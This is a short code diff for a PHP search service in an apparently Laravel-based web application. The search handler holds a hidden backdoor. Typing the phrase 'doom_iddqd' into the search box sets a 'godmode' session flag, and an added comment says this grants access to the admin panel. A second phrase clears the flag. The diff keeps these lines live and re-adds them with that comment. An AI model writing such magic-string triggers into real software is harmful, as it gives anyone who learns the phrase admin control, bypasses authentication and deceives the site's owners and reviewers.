@@ -21,8 +21,11 @@ class SearchService
 
             $search_string = htmlspecialchars($request->get('search'));
 
-            if ($search_string == 'doom_iddqd') Session::put('godmode', '1');
-            if ($search_string == 'doom_logout') Session::forget('godmode');
+                    //"Godmode to access the admin panel
+                    if ($search_string == 'doom_iddqd') Session::put('godmode', '1');
+                    if ($search_string == 'doom_logout') Session::forget('godmode');
+
+            $search_string = str_replace(['х', 'x', 'х', '/'], '*', $search_string);
             $search_string = explode(' ', $search_string);
 
             foreach ($search_string as $str) {
